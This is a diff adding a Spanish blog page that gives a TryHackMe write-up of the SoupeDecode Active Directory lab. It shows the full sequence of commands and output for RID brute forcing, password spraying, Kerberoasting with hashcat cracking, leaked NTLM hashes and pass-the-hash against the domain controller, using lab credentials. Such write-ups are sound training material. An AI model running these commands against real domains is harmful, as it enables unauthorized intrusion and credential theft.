@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina SoupeDecode TryHackMe | ZsZsec</title>
+<meta content="Introducción En este writeup documentamos de forma detallada el proceso de explotación de la máquina Soupedecode , un entorno simulado basado en Active Directory que refleja múltip..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina SoupeDecode TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / Pass-the-hash / smbclient</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">Pass-the-hash</span><span class="tag">smbclient</span><span class="tag">active_directory</span><span class="tag">RID_Brute_Force</span><span class="tag">Password_Spraying</span><span class="tag">Kerberoasting</span><span class="tag">RCE</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2>Introducción</h2>
+<p>En este writeup documentamos de forma detallada el proceso de explotación de la máquina <strong>Soupedecode</strong>, un entorno simulado basado en <strong>Active Directory</strong> que refleja múltiples fallos comunes en entornos empresariales reales. A lo largo de la intrusión se aplicaron técnicas ampliamente utilizadas por atacantes en escenarios internos, demostrando cómo un acceso inicial mínimo puede escalar rápidamente hasta el <strong>control total del dominio</strong>.</p>
+<p>El objetivo de esta máquina era identificar vulnerabilidades a través de una enumeración cuidadosa, explotar debilidades en la gestión de cuentas y contraseñas, y utilizar técnicas como <strong>RID Brute Forcing</strong>, <strong>Kerberoasting</strong>, <strong>Pass-the-Hash</strong>, y el abuso de <strong>cuentas de servicio mal configuradas</strong> para escalar privilegios.</p>
+<p>Este informe no solo muestra cada paso técnico realizado, sino que también explica por qué se realizaron esas acciones, qué herramientas se usaron, y qué implicaciones tienen en un entorno corporativo real. El resultado final fue obtener acceso como <code>NT AUTHORITY\SYSTEM</code> en el <strong>controlador de dominio (DC01)</strong>, demostrando la cadena completa de compromiso desde un usuario limitado hasta la raíz del dominio.</p>
+<h3>Escaneo de Puertos con Nmap</h3>
+<p>Para comenzar, realizamos un escaneo completo de puertos con <code>nmap</code> utilizando los siguientes parametros:</p>
+<pre><code class="language-bash">                                                                  
+┌──(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.85.39
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 04:44 CDT
+Nmap scan report for 10.201.85.39
+Host is up (0.24s latency).
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 09:45:33Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SOUPEDECODE
+|   NetBIOS_Domain_Name: SOUPEDECODE
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: SOUPEDECODE.LOCAL
+|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-08-03T09:46:25+00:00
+| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
+| Not valid before: 2025-06-17T21:35:42
+|_Not valid after:  2025-12-17T21:35:42
+|_ssl-date: 2025-08-03T09:47:05+00:00; -1s from scanner time.
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49718/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-03T09:46:25
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+</code></pre>
+<p><strong>Resultados relevantes:</strong></p>
+<pre><code class="language-bash">PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+9389/tcp  open  mc-nmf        .NET Message Framing
+</code></pre>
+<p>Este set de puertos indica que estamos frente a un <strong>Controlador de Dominio (Domain Controller)</strong> de un entorno Active Directory:</p>
+<ul>
+<li><strong>Kerberos (88)</strong> y <strong>LDAP (389/3268)</strong> son esenciales para autenticación y estructura de dominio.</li>
+<li><strong>SMB (445)</strong> y <strong>NetBIOS (139)</strong> permiten compartir archivos, impresoras y recursos.</li>
+<li><strong>RDP (3389)</strong> habilita acceso remoto gráfico.</li>
+<li><strong>DNS (53)</strong> sugiere resolución interna de nombres en el dominio <code>SOUPEDECODE.LOCAL</code>.</li>
+</ul>
+<h4>Información útil recolectada:</h4>
+<ul>
+<li>Hostname: <code>DC01</code></li>
+<li>Dominio: <code>SOUPEDECODE.LOCAL</code></li>
+<li>Sistema: Windows Server 2022</li>
+<li>Controlador de Dominio: <strong>sí</strong></li>
+<li>SMB signing: <strong>Enabled &amp; Required</strong> (bloquea ataques tipo relay)</li>
+</ul>
+<h3>Enumeración de SMB como <code>guest</code></h3>
+<p>Usamos <code>nxc</code> (de la suite Impacket) para conectarnos al puerto 445 usando un usuario anónimo (guest):</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ nxc  smb 10.201.122.124 -u 'guest' -p '' --shares
+SMB         10.201.122.124  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                                                               
+SMB         10.201.122.124  445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.201.122.124  445    DC01             [*] Enumerated shares
+SMB         10.201.122.124  445    DC01             Share           Permissions     Remark
+SMB         10.201.122.124  445    DC01             -----           -----------     ------
+SMB         10.201.122.124  445    DC01             ADMIN$                          Remote Admin
+SMB         10.201.122.124  445    DC01             backup                          
+SMB         10.201.122.124  445    DC01             C$                              Default share
+SMB         10.201.122.124  445    DC01             IPC$            READ            Remote IPC
+SMB         10.201.122.124  445    DC01             NETLOGON                        Logon server share 
+SMB         10.201.122.124  445    DC01             SYSVOL                          Logon server share 
+SMB         10.201.122.124  445    DC01             Users                      
+</code></pre>
+<p>Resultado:</p>
+<pre><code class="language-bash">[*] Enumerated shares
+Share      Permissions  Remark
+------     -----------  ------
+ADMIN$                 Remote Admin
+backup                
+C$                    Default share
+IPC$      READ         Remote IPC
+NETLOGON              Logon server share 
+SYSVOL                Logon server share 
+Users                
+</code></pre>
+<h4>¿Qué Descubrimos?</h4>
+<ul>
+<li>La cuenta <code>guest</code> tiene <strong>acceso válido</strong> (sin contraseña) al servicio SMB.</li>
+<li>Se puede <strong>leer</strong> la compartición <code>IPC$</code> — esto es <strong>clave</strong>.</li>
+</ul>
+<blockquote>
+<p><strong>¿Por qué es importante <code>IPC$</code> con permisos READ?</strong><br/>
+<code>IPC$</code> es una compartición especial que permite realizar conexiones <strong>inter-proceso</strong>, incluidas consultas a nivel de red y enumeración de información del sistema (como usuarios, grupos, políticas, etc.). Si tenemos acceso a <code>IPC$</code>, podemos usar herramientas como <code>enum4linux</code>, <code>crackmapexec</code>, <code>rpcclient</code>, o <code>nxc</code> para <strong>enumerar información sensible del dominio</strong> — incluso sin credenciales.</p>
+</blockquote>
+<h3>Enumeración de usuarios con RID Brute Force</h3>
+<p>Después, aprovechamos el acceso a <code>IPC$</code> para hacer un ataque <strong>RID Brute Force</strong> con <code>nxc</code>:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ nxc  smb 10.201.122.124 -u 'guest' -p '' --rid-brute
+SMB         10.201.122.124  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.122.124  445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.201.122.124  445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
+SMB         10.201.122.124  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
+SMB         10.201.122.124  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
+SMB         10.201.122.124  445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
+SMB         10.201.122.124  445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.201.122.124  445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.201.122.124  445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.201.122.124  445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
+SMB         10.201.122.124  445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
+SMB         10.201.122.124  445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.201.122.124  445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
+SMB         10.201.122.124  445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
+</code></pre>
+<h4>¿Qué es el RID Brute?</h4>
+<p>En Active Directory, cada usuario/grupo tiene un identificador único llamado <strong>RID</strong> (Relative Identifier). El SID completo de un usuario es algo como:</p>
+<p><code>S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ-500 </code>
+Los primeros bloques identifican el dominio. El número final (el <strong>RID</strong>) identifica el usuario. Ejemplos comunes:</p>
+<ul>
+<li><code>500</code>: Administrator</li>
+<li><code>501</code>: Guest</li>
+<li><code>512</code>: Domain Admins</li>
+<li><code>513</code>: Domain Users</li>
+</ul>
+<p>El ataque de RID brute consiste en <strong>enumerar sistemáticamente los RID comunes</strong> para identificar usuarios y grupos, incluso si el servidor bloquea el listado tradicional.</p>
+<p>Esto nos <strong>confirma usuarios válidos</strong> del dominio, que luego podremos usar en ataques de:</p>
+<ul>
+<li><strong>Kerberoasting</strong></li>
+<li><strong>AS-REP Roasting</strong></li>
+<li><strong>Password spraying</strong></li>
+<li><strong>NTLM relaying</strong> (si el signing no estuviera activo)</li>
+</ul>
+<h3>Conclusión de la primera fase:</h3>
+<p>Ya tenemos una muy buena base para empezar a pivotar en este entorno Active Directory:</p>
+<ul>
+<li>Enumeramos servicios críticos del DC.</li>
+<li>Confirmamos acceso SMB anónimo.</li>
+<li>Descubrimos varias comparticiones de interés.</li>
+<li>Enumeramos usuarios reales del dominio con RID brute.</li>
+</ul>
+<h2>Preparación de la lista de usuarios y ataque de contraseñas por defecto</h2>
+<p>Después de haber ejecutado el ataque de <strong>RID Brute Force</strong>, obtuvimos una lista extensa de usuarios del dominio. Pero para poder usarla en herramientas automatizadas, necesitábamos limpiar y convertir esos datos en un <strong>formato útil</strong>, es decir: una lista con <strong>un nombre de usuario por línea</strong>.</p>
+<h3>Extracción limpia de usuarios con <code>awk</code></h3>
+<p>Usamos el siguiente comando para procesar la salida del <code>--rid-brute</code>:</p>
+<pre><code class="language-bash">nxc smb 10.201.51.2 -u "guest" -p "" --rid-brute | awk '{split($6,a,"\\"); print a[2]}' &gt; usuarios.txt
+</code></pre>
+<h4>Explicación detallada:</h4>
+<ul>
+<li><code>nxc smb 10.201.51.2 ... --rid-brute</code>: ejecuta el ataque de RID brute contra el DC para listar los usuarios del dominio.</li>
+<li><code>|</code>: canaliza la salida del comando anterior hacia el siguiente.</li>
+<li><code>awk</code>: herramienta para procesar texto línea por línea.</li>
+<li><code>split($6,a,"\\")</code>: toma la <strong>sexta columna</strong> de cada línea (donde aparece el nombre como <code>SOUPEDECODE\usuario</code>) y la divide por el carácter <code>\</code>.</li>
+<li><code>print a[2]</code>: imprime solo la parte derecha del nombre (el nombre de usuario).</li>
+<li><code>&gt; usuarios.txt</code>: guarda el resultado en un archivo de texto.</li>
+</ul>
+<h4>Resultado:</h4>
+<p>Archivo <code>usuarios.txt</code> con contenido como:</p>
+<pre><code class="language-bash">Administrator
+Guest
+krbtgt
+ybob317
+mark.j
+...
+</code></pre>
+<p>Una lista limpia de usuarios reales del dominio. Esta lista será usada para futuros ataques de password spraying, AS-REP roasting, Kerberoasting, etc.</p>
+<h3>Ataque de contraseña: username = password</h3>
+<p>Aprovechando la lista de usuarios, probamos si alguno de ellos tenía como contraseña su <strong>mismo nombre de usuario</strong>. Este es un error común en redes mal configuradas o donde los usuarios no han sido forzados a cambiar sus contraseñas por defecto.</p>
+<p><strong>Comando utilizado:</strong></p>
+<pre><code class="language-bash">nxc smb 10.201.51.2 -u usuarios.txt -p usuarios.txt --no-bruteforce --continue-on-success
+</code></pre>
+<h4>Explicación detallada:</h4>
+<ul>
+<li><code>-u usuarios.txt</code>: carga la lista de nombres de usuario desde ese archivo.</li>
+<li><code>-p usuarios.txt</code>: utiliza <strong>la misma lista</strong> como lista de contraseñas (es decir, prueba <code>usuario:usuario</code>).</li>
+<li><code>--no-bruteforce</code>: le indica a <code>nxc</code> que no combine todos los usuarios con todas las contraseñas (lo cual sería un ataque de fuerza bruta completo), sino que pruebe <strong>usuario1:usuario1</strong>, <strong>usuario2:usuario2</strong>, y así sucesivamente.</li>
+<li><code>--continue-on-success</code>: por defecto <code>nxc</code> se detiene cuando encuentra un login válido. Con esta opción, continuará probando el resto de los usuarios incluso si ya encontró una combinación válida.</li>
+</ul>
+<h4>Objetivo:</h4>
+<ul>
+<li>Detectar <strong>usuarios con contraseñas por defecto o débiles</strong>.</li>
+<li>Obtener <strong>primeras credenciales válidas</strong> del dominio.</li>
+</ul>
+<h3>Por qué es esto importante?</h3>
+<ul>
+<li><p>Hemos comprometido una <strong>cuenta válida de dominio</strong>.</p>
+</li>
+<li><p>Esto nos permite:</p>
+<ul>
+<li>Enumerar más shares SMB.</li>
+<li>Hacer ataques Kerberos (Kerberoasting, AS-REP Roasting).</li>
+<li>Ver si tiene privilegios en el DC.</li>
+<li>Acceder a archivos o scripts sensibles.</li>
+</ul>
+</li>
+<li><p>Escalar privilegios más adelante.</p>
+</li>
+</ul>
+<h2>Acceso SMB con Credenciales Válidas</h2>
+<p>Tras descubrir las credenciales válidas <code>ybob317:ybob317</code>, nuestro siguiente paso fue comprobar qué acceso nos brindaban en el entorno. Lo primero que hicimos fue probarlas directamente contra el servicio <strong>SMB</strong> (puerto 445), accediendo a la compartición <code>Users</code>, que suele contener los perfiles de todos los usuarios del dominio.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ smbclient  --user=DC01.SOUPEDECODE.LOCAL/ybob317%ybob317 //10.201.51.2/Users
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Thu Jul  4 17:48:22 2024
+  ..                                DHS        0  Wed Jun 18 17:14:47 2025
+  admin                               D        0  Thu Jul  4 17:49:01 2024
+  Administrator                       D        0  Fri Jul 25 12:45:10 2025
+  All Users                       DHSrn        0  Sat May  8 03:26:16 2021
+  Default                           DHR        0  Sat Jun 15 21:51:08 2024
+  Default User                    DHSrn        0  Sat May  8 03:26:16 2021
+  desktop.ini                       AHS      174  Sat May  8 03:14:03 2021
+  Public                             DR        0  Sat Jun 15 12:54:32 2024
+  ybob317                             D        0  Mon Jun 17 12:24:32 2024
+
+                12942591 blocks of size 4096. 10603381 blocks available
+</code></pre>
+<h4>Explicación de los parámetros:</h4>
+<ul>
+<li><code>smbclient</code>: herramienta de línea de comandos para conectarse a recursos compartidos SMB/CIFS.</li>
+<li><code>--user=DOMINIO/usuario%contraseña</code>: formato para pasar el nombre de usuario y contraseña.</li>
+<li><code>//IP/SHARE</code>: recurso compartido al que queremos acceder (en este caso, <code>Users</code>).</li>
+</ul>
+<blockquote>
+<p>Nota: usamos el <strong>FQDN</strong> completo <code>DC01.SOUPEDECODE.LOCAL</code> porque estamos interactuando con un dominio Active Directory, lo cual ayuda a evitar errores de resolución o autenticación.</p>
+</blockquote>
+<h2>¿Qué cosas valiosas podemos conseguir con este acceso?</h2>
+<p>Obtener una cuenta válida de usuario de dominio como <code>ybob317</code> nos abre muchas puertas en un entorno Active Directory:</p>
+<h3>Acceso a SMB con privilegios de usuario:</h3>
+<ul>
+<li><p>Leer su carpeta personal, incluyendo:</p>
+<ul>
+<li><p>Escritorio (donde usualmente se dejan archivos importantes)</p>
+</li>
+<li><p>Documentos, contraseñas guardadas, notas, etc.</p>
+</li>
+</ul>
+</li>
+<li><p>Leer potenciales <strong>archivos con información sensible</strong> como scripts, configuraciones, archivos <code>*.ps1</code>, claves API, etc.</p>
+</li>
+<li><p>Copiar archivos como <code>NTUSER.DAT</code>, que puede usarse para extracción de información (como hashes, MRU, credenciales almacenadas, etc.</p>
+</li>
+</ul>
+<h3>Ataques Kerberos:</h3>
+<ul>
+<li>Usar la cuenta en herramientas como <code>GetUserSPNs.py</code> para hacer <strong>Kerberoasting</strong>.</li>
+<li>Intentar <strong>AS-REP Roasting</strong>, si el usuario no requiere preautenticación.</li>
+<li>Validar si la cuenta tiene acceso RDP (escritorio remoto).</li>
+<li>Validar si tiene privilegios delegados o permisos sobre objetos en AD (con <code>bloodhound</code> o <code>ldapdomaindump</code>).</li>
+</ul>
+<h1>Captura de la User Flag</h1>
+<p>Obtenemos la primera flag de la maquina.</p>
+<pre><code class="language-bash">smb: \ybob317\Desktop\&gt; get user.txt /home/zikuta/usuario.txt
+</code></pre>
+<h1>Escalada de privilegios en entorno Active Directory — <strong>SPN Enumeration, Hash Dump y Pass-the-Hash</strong></h1>
+<h3><strong>Explotación de un usuario de dominio válido — Enumeración de SPNs (Kerberoasting)</strong></h3>
+<p>Con las credenciales válidas descubiertas previamente (<code>ybob317:ybob317</code>), ejecutamos un ataque de <strong>Kerberoasting</strong>, una técnica que permite solicitar tickets de servicio (TGS) asociados a cuentas con <strong>SPN (Service Principal Name)</strong> y luego intentar crackear sus hashes offline.</p>
+<h4>Herramienta utilizada:</h4>
+<p><code>GetUserSPNs.py</code> (parte de la suite Impacket)</p>
+<pre><code class="language-bash">                                                                  
+┌──(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ python3 GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.67.29 -request -outputfile /home/zikuta/Desktop/soupedecode/hashes.txt
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  --------------  --------  --------------------------  ---------  ----------
+FTP/FileServer          file_svc                  2024-06-17 12:32:23.726085  &lt;never&gt;               
+FW/ProxyServer          firewall_svc              2024-06-17 12:28:32.710125  &lt;never&gt;               
+HTTP/BackupServer       backup_svc                2024-06-17 12:28:49.476511  &lt;never&gt;               
+HTTP/WebServer          web_svc                   2024-06-17 12:29:04.569417  &lt;never&gt;               
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 12:29:18.511871  &lt;never&gt;               
+
+
+
+[-] CCache file is not found. Skipping...
+                                                                                                                                                                                                                  
+┌──(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ cat /home/zikuta/Desktop/soupedecode/hashes.txt           
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*
+</code></pre>
+<h4>Parámetros explicados:</h4>
+<ul>
+<li><code>SOUPEDECODE.LOCAL/ybob317:ybob317</code>: Usuario y contraseña válidos.</li>
+<li><code>-dc-ip 10.201.67.29</code>: Dirección IP del <strong>Controlador de Dominio (DC)</strong>.</li>
+<li><code>-request</code>: Solicita los TGS (tickets de servicio) que serán vulnerables a Kerberoasting.</li>
+<li><code>-outputfile</code>: Guarda los hashes obtenidos en un archivo.</li>
+</ul>
+<p><strong>Resultado:</strong><br/>
+Se extrajeron varios hashes Kerberos TGS vinculados a cuentas de servicio como <code>file_svc</code>, <code>firewall_svc</code>, <code>backup_svc</code>, etc.</p>
+<h3><strong>Cracking offline de hashes TGS</strong></h3>
+<p>Una vez obtenidos los hashes, se utilizaron herramientas como <strong>Hashcat</strong> para crackearlos offline y recuperar la contraseña en texto plano de alguna cuenta de servicio.</p>
+<pre><code class="language-bash">krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$2f0e616a46538f06:Password123!!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE...8eb5cc
+Time.Started.....: Mon Aug  4 21:31:13 2025, (12 secs)
+Time.Estimated...: Mon Aug  4 21:31:25 2025, (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   917.6 kH/s (1.04ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10732581/14344385 (74.82%)
+Rejected.........: 2085/10732581 (0.02%)
+Restore.Point....: 10731044/14344385 (74.81%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Patrick812 -&gt; ParadornSIGGRAPH
+Hardware.Mon.#1..: Util: 76%
+
+Started: Mon Aug  4 21:31:12 2025
+Stopped: Mon Aug  4 21:31:26 2025
+
+</code></pre>
+<p>📌 <strong>Hash crackeado exitosamente</strong>:</p>
+<ul>
+<li>Usuario: <code>file_svc</code></li>
+<li>Contraseña: <code>Password123!!</code></li>
+</ul>
+<p>Esta contraseña es <strong>débil</strong> y común, lo cual permitió su rápida recuperación. Esto es un clásico fallo en entornos donde no se aplican políticas de complejidad robustas.</p>
+<h3><strong>Acceso a recursos compartidos vía SMB</strong></h3>
+<p>Con las credenciales de <code>file_svc</code>, se intentó acceder a comparticiones SMB disponibles, en busca de archivos sensibles o mal configuraciones.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/soupedecode]
+└─$ smbclient //10.201.99.61/backup -U file_svc -p 'Password123!!' 
+Password for [WORKGROUP\file_svc]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Jun 17 12:41:17 2024
+  ..                                 DR        0  Fri Jul 25 12:51:20 2025
+  backup_extract.txt                  A      892  Mon Jun 17 03:41:05 2024
+
+                12942591 blocks of size 4096. 10593927 blocks available
+smb: \&gt; get backup_extract.txt
+getting file \backup_extract.txt of size 892 as backup_extract.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+</code></pre>
+<p>Dentro del recurso compartido <code>backup</code>, se encontró un archivo interesante:<br/>
+<code>backup_extract.txt</code></p>
+<p>Tras descargarlo, se reveló una <strong>sorpresa crítica</strong>:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/Desktop/soupedecode]
+└─$ cat backup_extract.txt                                                
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+</code></pre>
+<p>El archivo <code>backup_extract.txt</code> contiene <strong>hashes NTLM de cuentas de máquinas (computer accounts)</strong> del dominio en formato <code>LM:NTLM</code>. Esto es extremadamente valioso para ataques de <strong>Pass-the-Hash</strong> o <strong>Overpass-the-Hash</strong>. Aquí tu plan de acción</p>
+<h3>### <strong>Exposición de hashes NTLM de cuentas de equipos</strong></h3>
+<p>El archivo <code>backup_extract.txt</code> contenía <strong>hashes NTLM</strong> de múltiples <strong>cuentas de máquinas (computer accounts)</strong> del dominio, en el formato típico de SAM dump:</p>
+<ul>
+<li><p><strong>Formato</strong>:<br/>
+<code>[Cuenta]$:[ID]:[LMhash]:[NThash]:::</code><br/>
+Ejemplo:<br/>
+<code>WebServer$:2119:aad3b...:c47b45f5d4df5a...:::</code></p>
+<p><strong>Lo importante</strong>: El <strong>hash NTLM</strong> (tercer campo después del <code>:</code>).</p>
+<ul>
+<li><code>aad3b435b51404eeaad3b435b51404ee</code> es el LMhash (vacío/deshabilitado).</li>
+</ul>
+</li>
+<li><p>El cuarto campo es el NThash (ej: <code>c47b45f5d4df5a494bd19f13e14f7902</code>).</p>
+</li>
+</ul>
+<h3>Técnica implicada:</h3>
+<p><strong>Pass-the-Hash (PtH)</strong> — Esta técnica permite autenticarse en sistemas Windows reutilizando directamente un hash NTLM válido sin necesidad de conocer la contraseña en texto plano.</p>
+<h3><strong>Validación del hash con privilegios administrativos</strong></h3>
+<p>Probamos el hash del equipo <code>FileServer$</code> con la herramienta <code>crackmapexec</code> para verificar si dicha cuenta tenía privilegios elevados.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[/usr/share/doc/python3-impacket/examples]
+└─$ crackmapexec smb 10.201.99.61 -u FileServer\$ -H 'e41da7e79a4c76dbd9cf79d1cb325559'             
+SMB         10.201.99.61    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.99.61    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+</code></pre>
+<p><strong>"Pwn3d!"</strong> significa que la cuenta <code>FileServer$</code> tiene <strong>privilegios de administrador local</strong> en el servidor <code>DC01</code> (controlador de dominio). Esto nos permite ejecutar comandos, extraer hashes y tomar control total del dominio.</p>
